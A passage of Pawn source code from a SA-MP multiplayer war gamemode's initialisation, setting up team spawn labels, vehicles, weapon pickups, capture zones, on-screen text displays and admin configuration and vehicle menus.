	Labels[18] = Create3DTextLabel("{FF0000}Russia Spawn\n{E10000}Spawn-Point", C_RED, -164.6844,1135.0851,19.7422, 50.0, 0, 0);
	Labels[19] = Create3DTextLabel("{FF0000}Russia Spawn\n{E10000}Spawn-Point", C_RED, -20.9232,1120.6238,19.8900, 50.0, 0, 0);
	Labels[20] = Create3DTextLabel("{9900CC}Australia Spawn\n{E10000}Spawn-Point", C_RED, 405.4855,2457.2576,16.5000, 50.0, 0, 0);
	Labels[21] = Create3DTextLabel("{9900CC}Australia Spawn\n{E10000}Spawn-Point", C_RED, 415.0857,2534.5173,19.1484, 50.0, 0, 0);
	Labels[22] = Create3DTextLabel("{9900CC}Australia Spawn\n{E10000}Spawn-Point", C_RED, 373.7360,2469.9290,16.4844, 50.0, 0, 0);
	Labels[23] = Create3DTextLabel("{0087FF}USA Spawn\n{E10000}Spawn-Point", COLOR_BLUE2, -250.4555,2595.8433,62.8582, 50.0, 0, 0);
	Labels[24] = Create3DTextLabel("{0087FF}USA Spawn\n{E10000}Spawn-Point", C_RED, -231.0395,2651.1475,62.8003, 50.0, 0, 0);
	Labels[25] = Create3DTextLabel("{0087FF}USA Spawn\n{E10000}Spawn-Point", C_RED, -282.5961,2728.5774,62.1439, 50.0, 0, 0);
	Labels[26] = Create3DTextLabel("{FF7E19}Vietnam Spawn\n{E10000}Spawn-Point", C_RED, -1419.25,2617.31,58.78, 50.0, 0, 0);
	Labels[27] = Create3DTextLabel("{FF7E19}Vietnam Spawn\n{E10000}Spawn-Point", C_RED, -1514.72,2527.27,60.46, 50.0, 0, 0);
	Labels[28] = Create3DTextLabel("{FF7E19}Vietnam Spawn\n{E10000}Spawn-Point", C_RED, -1534.39,2653.74,56.28, 50.0, 0, 0);


/////////////////////////////////Patriot////////////////////////////////
	BomberPatriot[0] = AddStaticVehicleEx(470, -219.6476, 2623.3438, 62.6043, 0.0000, -1, -1, 100); // Usa base
    PatriotObject[0] = CreateObject(3267, 0, 0, 0, 0.00000, 0.00000, -183.89996);
    BomberPatriot[1] = AddStaticVehicleEx(470, 410.4290, 2504.3289, 16.1271, 90.0000, -1, -1, 100); // Aus base
    PatriotObject[1] = CreateObject(3267, 0, 0, 0, 0.00000, 0.00000, -183.89996);
    BomberPatriot[2] = AddStaticVehicleEx(470, 1082.0477, 1878.5593, 10.4707, 0.0000, -1, -1, 100); // Eur Base
    PatriotObject[2] = CreateObject(3267, 0, 0, 0, 0.00000, 0.00000, -183.89996);
    BomberPatriot[3] = AddStaticVehicleEx(470, -1411.1101, 2639.9771, 55.4033, 90.0000, -1, -1, 100); // Viet Base
    PatriotObject[3] = CreateObject(3267, 0, 0, 0, 0.00000, 0.00000, -183.89996);
    BomberPatriot[4] = AddStaticVehicleEx(470, -863.2064, 1598.0447, 27.1365, 0.0000, -1, -1, 100); // Arabia
    PatriotObject[4] = CreateObject(3267, 0, 0, 0, 0.00000, 0.00000, -183.89996);



////////////////////////////////VEHICLES////////////////////////////////////////////////

	
	
	
//_______________________________________[Gates & other]________________________
meetinggate = CreateObject(1500, 2498.57983, -1612.65076, 1011.24847,   0.00000, 0.00000, -90.00000);
cabingate = CreateObject(1500, 2521.80981, -1603.09180, 1011.24847,   0.00000, 0.00000, 0.00000);
maingate=CreateObject(1500, 2501.95386, -1603.09180, 1011.24847,   0.00000, 0.00000, 0.00000);
//______________________________________________________________________________
//____________________________[Srijan textdraw]______________________________

Textdraw0 = TextDrawCreate(212.000000,379.000000,"_");
TextDrawUseBox(Textdraw0,1);
TextDrawBoxColor(Textdraw0,0x00000099);
TextDrawTextSize(Textdraw0,456.000000,134.000000);
TextDrawAlignment(Textdraw0,1);
TextDrawBackgroundColor(Textdraw0,0x000000ff);
TextDrawFont(Textdraw0,2);
TextDrawLetterSize(Textdraw0,0.440000, 1.000000);
TextDrawColor(Textdraw0,0xff0000ff);
TextDrawSetOutline(Textdraw0,1);
TextDrawSetProportional(Textdraw0,1);
TextDrawSetShadow(Textdraw0,10);
//stats box 1
PSTATS1 = TextDrawCreate(473.000000, 328.000000, "Rank: 0~n~Kills: 0");
TextDrawBackgroundColor(PSTATS1, 255);
TextDrawFont(PSTATS1, 2);
TextDrawLetterSize(PSTATS1, 0.149999, 1.100000);
TextDrawColor(PSTATS1, -1);
TextDrawSetOutline(PSTATS1, 0);
TextDrawSetProportional(PSTATS1, 1);
TextDrawSetShadow(PSTATS1, 0);
TextDrawUseBox(PSTATS1, 1);
TextDrawBoxColor(PSTATS1, 25);
TextDrawTextSize(PSTATS1, 653.000000, 77.000000);
//stats box 2
PSTATS2 = TextDrawCreate(573.000000, 328.000000, "Name:~n~Deaths:");
TextDrawBackgroundColor(PSTATS2, 255);
TextDrawFont(PSTATS2, 2);
TextDrawLetterSize(PSTATS2, 0.149998, 1.100000);
TextDrawColor(PSTATS2, -1);
TextDrawSetOutline(PSTATS2, 0);
TextDrawSetProportional(PSTATS2, 1);
TextDrawSetShadow(PSTATS2, 0);

//______________________________________________________________________________

//=======================================================================================================


	//Briefcases Aka Weapon Shopes

	RP = CreatePickup(1210,2,-148.4453,1110.0249,19.7500, -1);
	anthraxpickup = CreatePickup(1254, 2, -360.2002, 1597.1082, 76.7178, -1);
	AP = CreatePickup(1210,2,-797.5327,1556.2026,27.1244, -1);
	SL = CreatePickup(1254, 2, 213.98, 1822.96, 6.41);
	SLL = CreatePickup(1254, 2, -727.0796, 1873.7773, 2.4109);
	EP = CreatePickup(1210,2,1146.6642,1976.5652,10.8203, -1);
	A2P = CreatePickup(1210,2,385.2281,2474.4160,16.5000, -1);
	MP = CreatePickup(1210,2,-252.4021,2603.1230,62.8582, -1);
	VE = CreatePickup(1210,2,-1513.46,2521.09,55.80, -1);
	 //usa pickup

	//GangZones

	GZ_ZONE1 = GangZoneCreate(-353.515625,2574.21875,-113.28125,2796.875); //NEW USA
	GZ_ZONE2 = GangZoneCreate(994.1957, 1817.512, 1185.533, 2049.596); // Eurasia
	GZ_ZONE3 = GangZoneCreate(89.0625000000005,2418.75,466.40625,2617.96875); //AUSTRALIAN ARMADA
	GZ_ZONE4 = GangZoneCreate(-309.375,1024.21875,103.125,1211.71875); //Soviet Union
	GZ_ZONE5 = GangZoneCreate(-875.8406, 1389.667, -607.2495, 1623.225); //Arabia
    GZ_ZONE7 = GangZoneCreate(-1630.189208, 2433.570312, -1350.189208, 2729.570312);

	//Textdraws


	EUR = TextDrawCreate(205.000000, 250.000000, "~g~Eurasia");
	TextDrawBackgroundColor(EUR, 255);
	TextDrawFont(EUR, 1);
	TextDrawLetterSize(EUR, 0.500, 2.500);
	TextDrawColor(EUR, RED);
	TextDrawSetOutline(EUR, 1);
	TextDrawSetProportional(EUR, 1);
	TextDrawSetShadow(EUR,1);

	A = TextDrawCreate(205.000000, 250.000000, "~y~Arabia");
	TextDrawBackgroundColor(A, 255);
	TextDrawFont(A, 1);
	TextDrawLetterSize(A, 0.500, 2.500);
	TextDrawColor(A, RED);
	TextDrawSetOutline(A, 1);
	TextDrawSetProportional(A, 1);
	TextDrawSetShadow(A,1);

    I = TextDrawCreate(205.000000, 250.000000, "~y~Vietnam");
	TextDrawBackgroundColor(A, 255);
	TextDrawFont(I, 1);
	TextDrawLetterSize(A, 0.500, 2.500);
	TextDrawColor(I, RED);
	TextDrawSetOutline(I, 1);
	TextDrawSetProportional(I, 1);
	TextDrawSetShadow(I,1);

	S = TextDrawCreate(205.000000, 250.000000, "~r~Soviet");
	TextDrawBackgroundColor(S, 255);
	TextDrawFont(S, 1);
	TextDrawLetterSize(S, 0.500, 2.500);
	TextDrawColor(S, RED);
	TextDrawSetOutline(S, 1);
	TextDrawSetProportional(S, 1);
	TextDrawSetShadow(S,1);

	U = TextDrawCreate(205.000000, 250.000000, "~b~USA");
	TextDrawBackgroundColor(U, 255);
	TextDrawFont(U, 1);
	TextDrawLetterSize(U, 0.500, 2.500);
	TextDrawColor(U, RED);
	TextDrawSetOutline(U, 1);
	TextDrawSetProportional(U, 1);
	TextDrawSetShadow(U,1);

	Load = TextDrawCreate(250.000000, 0.000000, "New");
	TextDrawAlignment(Load, 2);
	TextDrawBackgroundColor(Load, 255);
	TextDrawFont(Load, 1);
	TextDrawLetterSize(Load, 0.000000, 1000.000000);
	TextDrawColor(Load, 255);
	TextDrawSetOutline(Load, 0);
	TextDrawSetProportional(Load, 0);
	TextDrawSetShadow(Load, 1);
	TextDrawUseBox(Load, 1);
	TextDrawBoxColor(Load, 255);
	TextDrawTextSize(Load, 40.000000, 1580.000000);

	A2 = TextDrawCreate(205.000000, 250.000000, "~p~Australia");
	TextDrawBackgroundColor(A2, 255);
	TextDrawFont(A2, 1);
	TextDrawLetterSize(A2, 0.500, 2.500);
	TextDrawColor(A2, RED);
	TextDrawSetOutline(A2, 1);
	TextDrawSetProportional(A2, 1);
	TextDrawSetShadow(A2,1);

   	welcometo1 = TextDrawCreate(304.000000, 51.000000, "WELCOME TO REAL WORLD AT WAR 2 SERVER!");
	TextDrawAlignment(welcometo1, 2);
	TextDrawBackgroundColor(welcometo1, -16776961);
	TextDrawFont(welcometo1, 2);
	TextDrawLetterSize(welcometo1, 0.600000, 2.000000);
	TextDrawColor(welcometo1, -1);
	TextDrawSetOutline(welcometo1, 1);
	TextDrawSetProportional(welcometo1, 1);

	welcometo2 = TextDrawCreate(211.000000, 353.000000, "xenon-extreme.com");
	TextDrawBackgroundColor(welcometo2, -1);
	TextDrawFont(welcometo2, 3);
	TextDrawLetterSize(welcometo2, 0.500000, 2.000000);
	TextDrawColor(welcometo2, -16776961);
	TextDrawSetOutline(welcometo2, 1);
	TextDrawSetProportional(welcometo2, 1);


	Web = TextDrawCreate(485.000000, 10.000000, "~b~xenon-extreme.com");
	TextDrawBackgroundColor(Web, 255);
	TextDrawFont(Web, 1);
	TextDrawLetterSize(Web, 0.330000, 1.200000);
	TextDrawColor(Web, -1);
	TextDrawSetOutline(Web, 1);
	TextDrawSetProportional(Web, 1);
	TextDrawSetShadow(Web,1);
	
    SetTimer("Zones_Update", 500, 1);
    for(new i=0; i<MAX_PLAYERS; i++)
	{
   	Zones[i] = TextDrawCreate(3.000000, 332.000000, "_");
   	TextDrawBackgroundColor(Zones[i], 65535);
   	TextDrawFont(Zones[i], 1);
   	TextDrawLetterSize(Zones[i], 0.440000, 1.000000);
   	TextDrawColor(Zones[i],  -5963521);
   	TextDrawSetOutline(Zones[i], 1);
   	TextDrawSetProportional(Zones[i], 1);
   	TextDrawSetShadow(Zones[i], 1);
   	TextDrawUseBox(Zones[i], 0);
   	TextDrawBoxColor(Zones[i], 0x00000076);
   	TextDrawTextSize(Zones[i], 606.000000, -2.000000);}

	UsePlayerPedAnims();
	DisableInteriorEnterExits();

    Star[0] = TextDrawCreate(485.000000, 100.000000, "]");
	TextDrawLetterSize(Star[0], 0.449999, 1.600000);
	TextDrawAlignment(Star[0], 1);
	TextDrawColor(Star[0], -5963521);
	TextDrawSetShadow(Star[0], 0);
	TextDrawSetOutline(Star[0], 1);
	TextDrawBackgroundColor(Star[0], 51);
	TextDrawFont(Star[0], 2);
	TextDrawSetProportional(Star[0], 1);

	Star[1] = TextDrawCreate(496.000000, 100.000000, "]");
	TextDrawLetterSize(Star[1], 0.449999, 1.600000);
	TextDrawAlignment(Star[1], 1);
	TextDrawColor(Star[1], -5963521);
	TextDrawSetShadow(Star[1], 0);
	TextDrawSetOutline(Star[1], 1);
	TextDrawBackgroundColor(Star[1], 51);
	TextDrawFont(Star[1], 2);
	TextDrawSetProportional(Star[1], 1);

	Star[2] = TextDrawCreate(507.000000, 100.000000, "]");
	TextDrawLetterSize(Star[2], 0.449999, 1.600000);
	TextDrawAlignment(Star[2], 1);
	TextDrawColor(Star[2], -5963521);
	TextDrawSetShadow(Star[2], 0);
	TextDrawSetOutline(Star[2], 1);
	TextDrawBackgroundColor(Star[2], 51);
	TextDrawFont(Star[2], 2);
	TextDrawSetProportional(Star[2], 1);

	Star[3] = TextDrawCreate(518.000000, 100.000000, "]");
	TextDrawLetterSize(Star[3], 0.449999, 1.600000);
	TextDrawAlignment(Star[3], 1);
	TextDrawColor(Star[3], -5963521);
	TextDrawSetShadow(Star[3], 0);
	TextDrawSetOutline(Star[3], 1);
	TextDrawBackgroundColor(Star[3], 51);
	TextDrawFont(Star[3], 2);
	TextDrawSetProportional(Star[3], 1);

	Star[4] = TextDrawCreate(529.000000, 100.000000, "]");
	TextDrawLetterSize(Star[4], 0.449999, 1.600000);
	TextDrawAlignment(Star[4], 1);
	TextDrawColor(Star[4], -5963521);
	TextDrawSetShadow(Star[4], 0);
	TextDrawSetOutline(Star[4], 1);
	TextDrawBackgroundColor(Star[4], 51);
	TextDrawFont(Star[4], 2);
	TextDrawSetProportional(Star[4], 1);

	Star[5] = TextDrawCreate(540.000000, 100.000000, "]");
	TextDrawLetterSize(Star[5], 0.449999, 1.600000);
	TextDrawAlignment(Star[5], 1);
	TextDrawColor(Star[5], -5963521);
	TextDrawSetShadow(Star[5], 0);
	TextDrawSetOutline(Star[5], 1);
	TextDrawBackgroundColor(Star[5], 51);
	TextDrawFont(Star[5], 2);
	TextDrawSetProportional(Star[5], 1);

	Star[6] = TextDrawCreate(551.000000, 100.000000, "]");
	TextDrawLetterSize(Star[6], 0.449999, 1.600000);
	TextDrawAlignment(Star[6], 1);
	TextDrawColor(Star[6], -5963521);
	TextDrawSetShadow(Star[6], 0);
	TextDrawSetOutline(Star[6], 1);
	TextDrawBackgroundColor(Star[6], 51);
	TextDrawFont(Star[6], 2);
	TextDrawSetProportional(Star[6], 1);

	Star[7] = TextDrawCreate(562.000000, 100.000000, "]");
	TextDrawLetterSize(Star[7], 0.449999, 1.600000);
	TextDrawAlignment(Star[7], 1);
	TextDrawColor(Star[7], -5963521);
	TextDrawSetShadow(Star[7], 0);
	TextDrawSetOutline(Star[7], 1);
	TextDrawBackgroundColor(Star[7], 51);
	TextDrawFont(Star[7], 2);
	TextDrawSetProportional(Star[7], 1);

	Star[8] = TextDrawCreate(573.000000, 100.000000, "]");
	TextDrawLetterSize(Star[8], 0.449999, 1.600000);
	TextDrawAlignment(Star[8], 1);
	TextDrawColor(Star[8], -5963521);
	TextDrawSetShadow(Star[8], 0);
	TextDrawSetOutline(Star[8], 1);
	TextDrawBackgroundColor(Star[8], 51);
	TextDrawFont(Star[8], 2);
	TextDrawSetProportional(Star[8], 1);

	Star[9] = TextDrawCreate(584.000000, 100.000000, "]");
	TextDrawLetterSize(Star[9], 0.449999, 1.600000);
	TextDrawAlignment(Star[9], 1);
	TextDrawColor(Star[9], -5963521);
	TextDrawSetShadow(Star[9], 0);
	TextDrawSetOutline(Star[9], 1);
	TextDrawBackgroundColor(Star[9], 51);
	TextDrawFont(Star[9], 2);
	TextDrawSetProportional(Star[9], 1);

	//---------
	
// PARAMETER FORMAT

// Float:minx, Float:miny, Float:maxx, Float:maxy

//====================================================================
    //snakes farm
    CP[SNAKE] = CreateDynamicCP(-36.5458, 2347.6426, 24.1406,3, -1,-1,-1,100.0);
    Zone[SNAKE] = GangZoneCreate(-62.5000000000005,2318.359375,23.4375,2390.625);
    //bayside sea shore
    CP[BAY] = CreateDynamicCP(260.0900,2889.5242,11.1854,3, -1,-1,-1,100.0);
    Zone[BAY] = GangZoneCreate(236.328125,2892.578125,292.96875,2943.359375);
    //area 51
    CP[BIG] = CreateDynamicCP(269.33456,1839.13049,6.14055,3, -1,-1,-1,100.0);
    Zone[BIG] = GangZoneCreate(-46.875,1697.265625,423.828125,2115.234375);
	//army hotel
	CP[ARMY] = CreateDynamicCP(-551.6992,2593.0771,53.9348,3, -1,-1,-1,100.0);
	Zone[ARMY] = GangZoneCreate(-617.1875,2531.25,-455.078125,2658.203125);
	//army petrol bunk
	CP[PETROL] = CreateDynamicCP(670.9215,1705.4658,7.1875,3, -1,-1,-1,100.0);
	Zone[PETROL] = GangZoneCreate(609.375,1652.34375,714.84375,1767.578125);
	//Oil Factory
	CP[OIL] = CreateDynamicCP(221.0856,1422.6615,10.5859,3, -1,-1,-1,100.0);
	Zone[OIL] = GangZoneCreate(95.703125,1339.84375,287.109375,1484.375);
	//Oil Station
	CP[DESERT] = CreateDynamicCP(558.9932,1221.8896,11.7188,3, -1,-1,-1,100.0);
	Zone[DESERT] = GangZoneCreate(529.296875,1205.078125,636.71875,1267.578125);
    //559.5272,1221.7778,11.7188
    //Quarry
	CP[QUARRY] = CreateDynamicCP(588.3246,875.7402,-42.4973,3, -1,-1,-1,100.0);
	Zone[QUARRY] = GangZoneCreate(439.453125,748.046875,863.28125,992.1875);
    //Desert Guest House
	CP[GUEST] = CreateDynamicCP(-314.8433,1773.9176,43.6406,3, -1,-1,-1,100.0);
	Zone[GUEST] = GangZoneCreate(-357.421875,1707.03125,-253.90625,1835.9375);
    //Big Ear
	CP[EAR] = CreateDynamicCP(-311.0136,1542.9733,75.5625,3, -1,-1,-1,100.0);
	Zone[EAR] = GangZoneCreate(-437.5,1513.671875,-244.140625,1636.71875);
	// Subs
	CP[SUBS] = CreateDynamicCP(-725.1169, 1869.6428, 2.4109,3, -1,-1,-1,100.0);
	Zone[SUBS] = GangZoneCreate(-757.4594, 1828.9303, -699.1934, 1909.3093);
		 //Abondoned City Hill

	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
        TeamText[playerid] = TextDrawCreate(7.000000, 428.000000, "General Of Army - Australia");
		TextDrawBackgroundColor(TeamText[playerid], 255);
		TextDrawFont(TeamText[playerid], 1);
		TextDrawLetterSize(TeamText[playerid], 0.410000, 1.500000);
		TextDrawColor(TeamText[playerid], -1);
		TextDrawSetOutline(TeamText[playerid], 1);
		TextDrawSetProportional(TeamText[playerid], 1);
		//------
		Rank1[playerid] = TextDrawCreate(485.000000,115.000000,"~w~Rank:~g~Corporal");
	    TextDrawAlignment(Rank1[playerid],0);
	    TextDrawBackgroundColor(Rank1[playerid], 255);
	    TextDrawFont(Rank1[playerid], 1);
	    TextDrawLetterSize(Rank1[playerid],0.299999,0.799999);
	    TextDrawColor(Rank1[playerid], RED);
	    TextDrawSetOutline(Rank1[playerid],1);
	    TextDrawSetProportional(Rank1[playerid],1);
	    TextDrawSetShadow(Rank1[playerid],1);
	    //-------
	    CountText[playerid] = TextDrawCreate(192.000000, 416.000000, "0 Left To Capture.");
		TextDrawBackgroundColor(CountText[playerid], 255);
		TextDrawFont(CountText[playerid], 1);
		TextDrawLetterSize(CountText[playerid], 0.460000, 1.900000);
		TextDrawColor(CountText[playerid], -1);
		TextDrawSetOutline(CountText[playerid], 1);
		TextDrawSetProportional(CountText[playerid], 1);
		//==============================================================================

        ZoneTextdraw_[0][playerid] = TextDrawCreate(270.000000, 340.000000, "BOX");
		TextDrawBackgroundColor(ZoneTextdraw_[0][playerid], 255);
		TextDrawFont(ZoneTextdraw_[0][playerid], 1);
		TextDrawLetterSize(ZoneTextdraw_[0][playerid], 0.000000, 7.000000);
		TextDrawColor(ZoneTextdraw_[0][playerid], -1);
		TextDrawSetOutline(ZoneTextdraw_[0][playerid], 0);
		TextDrawSetProportional(ZoneTextdraw_[0][playerid], 1);
		TextDrawSetShadow(ZoneTextdraw_[0][playerid], 1);
		TextDrawTextSize(ZoneTextdraw_[0][playerid], 390.000000, 0.000000);
		TextDrawSetSelectable(ZoneTextdraw_[0][playerid], 0);

		ZoneTextdraw_[1][playerid] = TextDrawCreate(5.000000, 211.000000, "CAPTURING...");
		TextDrawBackgroundColor(ZoneTextdraw_[1][playerid], 255);
		TextDrawFont(ZoneTextdraw_[1][playerid], 0);
		TextDrawLetterSize(ZoneTextdraw_[1][playerid], 0.439999, 2.499999);
		TextDrawColor(ZoneTextdraw_[1][playerid], 16777215);
		TextDrawSetOutline(ZoneTextdraw_[1][playerid], 1);
		TextDrawSetProportional(ZoneTextdraw_[1][playerid], 1);
		TextDrawSetSelectable(ZoneTextdraw_[1][playerid], 0);

		ZoneTextdraw_[2][playerid] = TextDrawCreate(9.000000, 244.000000, "~r~Zone: ~w~Bigear~n~~p~Controlled by: ~w~Soviet");
		TextDrawBackgroundColor(ZoneTextdraw_[2][playerid], 255);
		TextDrawFont(ZoneTextdraw_[2][playerid], 2);
		TextDrawLetterSize(ZoneTextdraw_[2][playerid], 0.189999, 1.299999);
		TextDrawColor(ZoneTextdraw_[2][playerid], -1);
		TextDrawSetOutline(ZoneTextdraw_[2][playerid], 1);
		TextDrawSetProportional(ZoneTextdraw_[2][playerid], 1);
		TextDrawSetSelectable(ZoneTextdraw_[2][playerid], 0);

		ZoneTextdraw_[3][playerid] = TextDrawCreate(40.000000, 233.000000, "100%");
		TextDrawBackgroundColor(ZoneTextdraw_[3][playerid], 255);
		TextDrawFont(ZoneTextdraw_[3][playerid], 3);
		TextDrawLetterSize(ZoneTextdraw_[3][playerid], 0.249999, 1.199999);
		TextDrawColor(ZoneTextdraw_[3][playerid], -1);
		TextDrawSetOutline(ZoneTextdraw_[3][playerid], 1);
		TextDrawSetProportional(ZoneTextdraw_[3][playerid], 1);
		TextDrawSetSelectable(ZoneTextdraw_[3][playerid], 0);
//==============================================================================
		//-------
	    RankLabel[playerid] = Create3DTextLabel(" ", 0x008080FF, 30.0, 40.0, 50.0, 40.0, 0);
	}
    if(!fexist("ladmin/"))
	{
	    print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin");
		return 1;
	}
	if(!fexist("ladmin/logs/"))
	{
	    print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin/logs");
		return 1;
	}
	if(!fexist("ladmin/config/"))
	{
	    print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin/config");
		return 1;
	}
	if(!fexist("ladmin/users/"))
	{
	    print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin/users");
		return 1;
	}
	UpdateConfig();

	#if defined DISPLAY_CONFIG
	ConfigInConsole();
	#endif


      PingTimer = SetTimer("PingKick",10000,1);
	//===================== [ The Menus ]===========================//
	#if defined USE_MENUS

	LMainMenu = CreateMenu("Main Menu", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LMainMenu, 0, "Choose an option below");
	AddMenuItem(LMainMenu, 0, "Enable");
	AddMenuItem(LMainMenu, 0, "Disable");
    AddMenuItem(LMainMenu, 0, "Server Weather");
    AddMenuItem(LMainMenu, 0, "Server Time");
 	AddMenuItem(LMainMenu, 0, "All Vehicles");
	AddMenuItem(LMainMenu, 0, "Admin Cars");
	AddMenuItem(LMainMenu, 0, "Tuning Menu");
	AddMenuItem(LMainMenu, 0, "Choose Weapon");
	AddMenuItem(LMainMenu, 0, "Teleports");
	AddMenuItem(LMainMenu, 0, "Exit Menu");//

	AdminEnable = CreateMenu("~b~Configuration ~g~ Menu",2, 55.0, 200.0, 150.0, 80.0);
	SetMenuColumnHeader(AdminEnable, 0, "Enable");
	AddMenuItem(AdminEnable, 0, "Anti Swear");
	AddMenuItem(AdminEnable, 0, "Bad Name Kick");
	AddMenuItem(AdminEnable, 0, "Anti Spam");
	AddMenuItem(AdminEnable, 0, "Ping Kick");
	AddMenuItem(AdminEnable, 0, "Read Cmds");
	AddMenuItem(AdminEnable, 0, "Read PMs");
	AddMenuItem(AdminEnable, 0, "Capital Letters");
	AddMenuItem(AdminEnable, 0, "ConnectMessages");
	AddMenuItem(AdminEnable, 0, "AdminCmdMessages");
	AddMenuItem(AdminEnable, 0, "Auto Login");
	AddMenuItem(AdminEnable, 0, "Return");

	AdminDisable = CreateMenu("~b~Configuration ~g~ Menu",2, 55.0, 200.0, 150.0, 80.0);
	SetMenuColumnHeader(AdminDisable, 0, "Disable");
	AddMenuItem(AdminDisable, 0, "Anti Swear");
	AddMenuItem(AdminDisable, 0, "Bad Name Kick");
	AddMenuItem(AdminDisable, 0, "Anti Spam");
	AddMenuItem(AdminDisable, 0, "Ping Kick");
	AddMenuItem(AdminDisable, 0, "Read Cmds");
	AddMenuItem(AdminDisable, 0, "Read PMs");
	AddMenuItem(AdminDisable, 0, "Capital Letters");
	AddMenuItem(AdminDisable, 0, "ConnectMessages");
	AddMenuItem(AdminDisable, 0, "AdminCmdMessages");
	AddMenuItem(AdminDisable, 0, "Auto Login");
	AddMenuItem(AdminDisable, 0, "Return");

	LWeather = CreateMenu("~b~Weather ~g~ Menu",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LWeather, 0, "Set Weather");
	AddMenuItem(LWeather, 0, "Clear Blue Sky");
	AddMenuItem(LWeather, 0, "Sand Storm");
	AddMenuItem(LWeather, 0, "Thunderstorm");
	AddMenuItem(LWeather, 0, "Foggy");
	AddMenuItem(LWeather, 0, "Cloudy");
	AddMenuItem(LWeather, 0, "High Tide");
	AddMenuItem(LWeather, 0, "Purple Sky");
	AddMenuItem(LWeather, 0, "Black/White Sky");
	AddMenuItem(LWeather, 0, "Dark, Green Sky");
	AddMenuItem(LWeather, 0, "Heatwave");
	AddMenuItem(LWeather,0,"Return");

	LTime = CreateMenu("~b~Time ~g~ Menu", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LTime, 0, "Set Time");
	AddMenuItem(LTime, 0, "Morning");
	AddMenuItem(LTime, 0, "Mid day");
	AddMenuItem(LTime, 0, "Afternoon");
	AddMenuItem(LTime, 0, "Evening");
	AddMenuItem(LTime, 0, "Midnight");
    AddMenuItem(LTime, 0, "Return");

	LCars = CreateMenu("~b~LethaL ~g~Cars", 2,  55.0, 150.0, 100.0, 80.0);
	SetMenuColumnHeader(LCars, 0, "Choose a car");
	AddMenuItem(LCars, 0, "Turismo");
	AddMenuItem(LCars, 0, "Bandito");
	AddMenuItem(LCars, 0, "Vortex");
	AddMenuItem(LCars, 0, "NRG");
	AddMenuItem(LCars, 0, "S.W.A.T");
    AddMenuItem(LCars, 0, "Hunter");
    AddMenuItem(LCars, 0, "Jetmax (boat)");
    AddMenuItem(LCars, 0, "Rhino");
    AddMenuItem(LCars, 0, "Monster Truck");
    AddMenuItem(LCars, 0, "Sea Sparrow");
    AddMenuItem(LCars, 0, "More");
	AddMenuItem(LCars, 0, "Return");

	LCars2 = CreateMenu("~b~LethaL ~g~Cars", 2,  55.0, 150.0, 100.0, 80.0);
	SetMenuColumnHeader(LCars2, 0, "Choose a car");
	AddMenuItem(LCars2, 0, "Dumper");
    AddMenuItem(LCars2, 0, "RC Tank");
    AddMenuItem(LCars2, 0, "RC Bandit");
    AddMenuItem(LCars2, 0, "RC Baron");
    AddMenuItem(LCars2, 0, "RC Goblin");
    AddMenuItem(LCars2, 0, "RC Raider");
    AddMenuItem(LCars2, 0, "RC Cam");
    AddMenuItem(LCars2, 0, "Tram");
	AddMenuItem(LCars2, 0, "Return");

	LTuneMenu = CreateMenu("~b~Tuning ~g~ Menu",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LTuneMenu, 0, "Add to car");
	AddMenuItem(LTuneMenu,0,"NOS");
	AddMenuItem(LTuneMenu,0,"Hydraulics");
	AddMenuItem(LTuneMenu,0,"Wire Wheels");
	AddMenuItem(LTuneMenu,0,"Twist Wheels");
	AddMenuItem(LTuneMenu,0,"Access Wheels");
	AddMenuItem(LTuneMenu,0,"Mega Wheels");
	AddMenuItem(LTuneMenu,0,"Import Wheels");
	AddMenuItem(LTuneMenu,0,"Atomic Wheels");
	AddMenuItem(LTuneMenu,0,"Offroad Wheels");
	AddMenuItem(LTuneMenu,0,"Classic Wheels");
	AddMenuItem(LTuneMenu,0,"Paint Jobs");
	AddMenuItem(LTuneMenu,0,"Return");

	PaintMenu = CreateMenu("~b~Paint Job ~g~ Menu",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(PaintMenu, 0, "Choose paint");
	AddMenuItem(PaintMenu,0,"Paint Job 1");
	AddMenuItem(PaintMenu,0,"Paint Job 2");
	AddMenuItem(PaintMenu,0,"Paint Job 3");
	AddMenuItem(PaintMenu,0,"Paint Job 4");
	AddMenuItem(PaintMenu,0,"Paint Job 5");
	AddMenuItem(PaintMenu,0,"Black");
	AddMenuItem(PaintMenu,0,"White");
	AddMenuItem(PaintMenu,0,"Blue");
	AddMenuItem(PaintMenu,0,"Pink");
	AddMenuItem(PaintMenu,0,"Return");

	LVehicles = CreateMenu("~b~Vehicles ~g~ Menu",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LVehicles, 0, "Choose a car");
	AddMenuItem(LVehicles,0,"2-door Cars");
	AddMenuItem(LVehicles,0,"4-door Cars");
	AddMenuItem(LVehicles,0,"Fast Cars");
	AddMenuItem(LVehicles,0,"Other Vehicles");
	AddMenuItem(LVehicles,0,"Bikes");
	AddMenuItem(LVehicles,0,"Boats");
	AddMenuItem(LVehicles,0,"Planes");
	AddMenuItem(LVehicles,0,"Helicopters");
	AddMenuItem(LVehicles,0,"Return");

 	twodoor = CreateMenu("~b~2-door Cars",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(twodoor, 0, "Choose a car");
	AddMenuItem(twodoor,0,"Feltzer");//533
	AddMenuItem(twodoor,0,"Stallion");//139
	AddMenuItem(twodoor,0,"Windsor");//555
	AddMenuItem(twodoor,0,"Bobcat");//422
	AddMenuItem(twodoor,0,"Yosemite");//554
	AddMenuItem(twodoor,0,"Broadway");//575
	AddMenuItem(twodoor,0,"Blade");//536
	AddMenuItem(twodoor,0,"Slamvan");//535
	AddMenuItem(twodoor,0,"Tornado");//576
	AddMenuItem(twodoor,0,"Bravura");//401
	AddMenuItem(twodoor,0,"Fortune");//526
	AddMenuItem(twodoor,0,"Return");

